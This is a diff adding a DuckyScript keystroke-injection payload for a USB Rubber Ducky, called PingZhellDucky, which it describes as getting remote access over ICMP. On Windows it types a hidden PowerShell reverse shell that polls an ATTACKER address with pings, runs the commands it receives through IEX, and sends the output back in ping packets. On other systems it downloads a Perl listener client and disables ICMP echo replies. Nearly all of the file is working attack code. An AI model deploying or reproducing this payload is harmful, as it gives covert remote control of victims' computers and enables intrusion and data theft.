@@ -1,0 +1,78 @@
+REM PingZhellDucky
+REM Version 1.2
+REM OS: Windows & Unix
+REM Author: 0iphor13
+REM Requirements: DuckScript 3.0, Perl
+
+REM       Getting remote access via ICMP or perform the required setup
+
+REM PASSIVE_WINDOWS_DETECT extension, made by Korben, to indentify the OS
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.0
+
+    REM Windows fully passive OS Detection and passive Detect Ready
+    REM Includes its own passive detect ready. Does not require
+    REM additional extensions
+
+    REM USAGE:
+    REM Extension runs inline (here)
+    REM Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+    REM boot delay
+    REM $_OS will be set to WINDOWS or NOT_WINDOWS
+
+    REM CONFIGURATION:
+    DEFINE MAX_WAIT 150
+    DEFINE CHECK_INTERVAL 20
+    DEFINE WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE NOT_WINDOWS 7
+
+    VAR $MAX_TRIES = MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    ELSE
+        $_OS = NOT_WINDOWS
+    END_IF
+
+    REM EXAMPLE USAGE AFTER EXTENSION
+    REM IF ($_OS == WINDOWS) THEN
+    REM     STRING HELLO WINDOWS!
+    REM ELSE
+    REM     STRING HELLO WORLD!
+    REM END_IF
+END_EXTENSION
+
+REM Configure your settings below:
+REM Insert the attacking IP between ''
+DEFINE ATTACKER '0.0.0.0'
+REM Set the default DELAY
+DEFINE WAIT 250
+REM Do you want to install the dependencies and set up the infratructre?
+REM Will trigger when not using Windows - Best use with Linux
+DEFINE INSTALL TRUE
+REM Link to the PingZhellDucky.pl client - Required for installation
+DEFINE CLIENTLINK https://raw.githubusercontent.com/0iphor13/usbrubberducky-payloads/master/payloads/library/remote_access/PingZhellDucky/PingZhellDucky.pl
+
+
+IF ($_OS == WINDOWS) THEN
+    DELAY 1500
+    GUI r
+    DELAY 500
+    STRINGLN powershell -NoP -NonI -w h
+    DELAY 500
+    STRING ;$Delay=5;$BufferSize=128;$ICMPDucky=New-Object System.Net.NetworkInformation.Ping;$PingDuck=New-Object System.Net.NetworkInformation.PingOptions;$PingDuck.DontFragment = $True;$QuackAttack = ([text.encoding]::ASCII).GetBytes('Ducky@PS '+(gl).Path+'> ');$ICMPDucky.Send( ATTACKER ,60 * 1000, $QuackAttack, $PingDuck) | Out-Null;while ($true){$QuackAttack=([text.encoding]::ASCII).GetBytes('');$reply=$ICMPDucky.Send( ATTACKER ,60 * 1000, $QuackAttack, $PingDuck);if ($reply.Buffer){$response=([text.encoding]::ASCII).GetString($reply.Buffer);$result=(IeX -Command $response 2>&1 | Out-String );$QuackAttack = ([text.encoding]::ASCII).GetBytes($result);$index=[math]::floor($QuackAttack.length/$BufferSize);$i = 0;
+    DELAY WAIT
+    STRINGLN if($QuackAttack.length -gt $BufferSize){while ($i -lt $index ){$NGGYU2 = $QuackAttack[($i*$BufferSize)..(($i+1)*$BufferSize-1)];$ICMPDucky.Send( ATTACKER ,60 * 10000, $NGGYU2, $PingDuck) | Out-Null;$i +=1;};$remainingindex=$QuackAttack.Length % $BufferSize;if($remainingindex -ne 0){$NGGYU2 = $QuackAttack[($i*$BufferSize)..($QuackAttack.Length)];$ICMPDucky.Send( ATTACKER ,60 * 10000, $NGGYU2, $PingDuck) | Out-Null}}else{$ICMPDucky.Send( ATTACKER ,60 * 10000, $QuackAttack, $PingDuck) | Out-Null};$QuackAttack = ([text.encoding]::ASCII).GetBytes("`nDucky@PS " + (pwd).Path + '> ');$ICMPDucky.Send( ATTACKER ,60 * 1000, $QuackAttack, $PingDuck) | Out-Null}else{Start-Sleep -Seconds $Delay}}
+ELSE
+    IF INSTALL THEN
+        DELAY WAIT
+        STRINGLN echo "Setting up Infrastructre - Do not interact!"
+        DELAY 2000
+        STRINGLN cpan IO::Socket NetPacket::IP NetPacket::ICMP && wget CLIENTLINK && sysctl -w net.ipv4.icmp_echo_ignore_all=1 && echo "Setup complete!"
+    ELSE
+        STRING Please insert device into a Windows machine or change the settings!
+END_IF
+END_IF
